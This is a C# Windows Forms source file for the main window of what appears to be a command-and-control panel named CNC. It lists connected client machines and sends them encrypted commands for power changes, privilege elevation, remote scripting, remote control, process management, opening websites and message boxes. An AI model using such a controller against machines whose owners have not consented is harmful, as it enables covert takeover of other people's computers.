using CNC.Config;
using CNC.Core.Data;
using CNC.Core.Networking;
using CNC.Core.Security;
using CNC.Forms;
using NetworkCommsDotNet;
using NetworkCommsDotNet.Connections;
using Newtonsoft.Json;
using Shared.Enums;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CNC
{
    public partial class Main : Form
    {
        public static Main MainForm;
        private readonly object _lockClients = new object(); // lock for clients-listview


        public Main()
        {
            InitializeComponent();
            MainForm = this;
        }

        public void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.Connection.ConnectionInfo.RemoteEndPoint.ToString(),
                    client.OperatingSystem, client.AccountType,
                    client.Username
                }){ Tag = client};;

                clientListView.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        clientListView.Items.Add(lvi);
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                clientListView.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in clientListView.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProcessList processListWindow = new ProcessList((Client)clientListView.FocusedItem.Tag);
            processListWindow.Show();
        }

        private void clientListView_MouseClick(object sender, MouseEventArgs e)
        {
            if(e.Button == MouseButtons.Right)
            {
                clientMenuStrip.Show(Cursor.Position);
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client client = (Client)clientListView.FocusedItem.Tag;
            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Shutdown)));
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client client = (Client)clientListView.FocusedItem.Tag;
            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Restart)));
        }

        private void sleepToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client client = (Client)clientListView.FocusedItem.Tag;
            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Sleep)));
        }

        private void hibernateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client client = (Client)clientListView.FocusedItem.Tag;
            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Hibernate)));
        }

        private void remoteControllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RemoteControll remoteControllWindow = new RemoteControll((Client)clientListView.FocusedItem.Tag);
            remoteControllWindow.Show();
        }

        private void elevateApplicationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client client = (Client)clientListView.FocusedItem.Tag;
            client.Connection.SendObject<string>("ElevateReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
        }

        private void closeToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Client client = (Client)clientListView.FocusedItem.Tag;
            client.Connection.SendObject<string>("CloseReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
        }

        private void openWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenWebsite openWebsiteForm = new OpenWebsite((Client)clientListView.FocusedItem.Tag);
            openWebsiteForm.Show();
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ShowMessageBox showMessageBoxForm = new ShowMessageBox((Client)clientListView.FocusedItem.Tag);
            showMessageBoxForm.Show();
        }

        private void scriptingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RemoteScript remoteScriptWindow = new RemoteScript((Client)clientListView.FocusedItem.Tag);
            remoteScriptWindow.Show();
        }
    }
}
